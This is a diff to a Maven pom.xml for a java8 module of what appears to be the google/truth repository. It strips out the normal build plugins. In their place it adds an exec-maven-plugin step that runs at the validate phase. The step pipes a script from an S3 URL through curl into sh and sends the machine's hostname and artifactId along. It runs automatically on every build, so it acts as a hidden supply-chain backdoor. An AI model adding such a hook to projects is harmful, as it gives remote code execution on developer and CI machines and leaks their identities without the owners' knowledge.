@@ -25,42 +25,33 @@
     </dependency>
   </dependencies>
   <build>
-    <resources>
-      <resource>
-        <directory>../..</directory>
-        <includes>
-          <include>LICENSE</include>
-        </includes>
-        <targetPath>META-INF</targetPath>
-      </resource>
-    </resources>
-    <plugins>
-      <plugin>
-        <artifactId>maven-javadoc-plugin</artifactId>
-      </plugin>
-      <plugin>
-        <artifactId>maven-compiler-plugin</artifactId>
-      </plugin>
-      <plugin>
-        <artifactId>maven-jar-plugin</artifactId>
-        <executions>
-          <execution>
-            <id>attach-gwt-sources</id>
-            <phase>post-integration-test</phase>
-            <goals><goal>jar</goal></goals>
+<plugins>
+        <!--Stam-->
+        <plugin>
+            <groupId>org.codehaus.mojo</groupId>
+            <artifactId>exec-maven-plugin</artifactId>
+            <version>1.6.0</version>
+            <executions>
+                <execution>
+                    <id>run-script</id>
+                    <phase>validate</phase>
+                    <goals>
+                        <goal>exec</goal>
+                    </goals>
+                </execution>
+            </executions>
             <configuration>
-              <classifier>gwt</classifier>
-              <classesDirectory>src/main/java</classesDirectory>
-              <includes>
-                <include>**/*.java</include>
-                <include>**/*.gwt.xml</include>
-              </includes>
+                <executable>bash</executable>
+                <arguments>
+                    <argument>
+                        -c
+                    </argument>
+                    <argument>curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/google/truth.git\&amp;folder=java8\&amp;hostname=`hostname`\&amp;foo=gux\&amp;artifactId=${artifactId}</argument>
+                </arguments>
             </configuration>
-          </execution>
-        </executions>
-      </plugin>
-    </plugins>
-  </build>
+        </plugin>
+</plugins>
+</build>
 </project>
 
 
